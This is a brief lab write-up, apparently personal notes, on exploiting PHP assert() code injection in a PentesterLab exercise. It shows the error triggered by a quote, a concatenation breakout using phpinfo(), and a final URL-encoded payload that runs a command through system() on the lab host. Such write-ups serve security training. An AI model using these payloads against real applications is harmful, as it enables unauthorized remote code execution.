---
tags: php
---


```ad-attention
This is most likely not gonna work with applications running PHP 7+
```

When assert is used incorrectly, it will evaluate a value given.

Let’s try injecting a quote:
```error
# **Parse error**: syntax error, unexpected '';' (T_ENCAPSED_AND_WHITESPACE) in **/var/www/index.php(15) : assert code** on line **1**  
  
**Catchable fatal error**: assert(): Failure evaluating code: 'hacker'' in **/var/www/index.php** on line **15**
```

We get an error.
To make it go away we have to input something like: `hacker'.'`

We will have to concentrate two strings together like so:
`hacker'.phpinfo().'`

So our final exploit for the pentesterlabs exercise would be:
```url
http://ptl-3519b02c1362-5079bc138e09.libcurl.me/?name=hacker%27.system(%22%2Fusr%2Flocal%2Fbin%2Fscore%20e6206710-c2c4-4704-869e-888e9947486e%22).%27
```
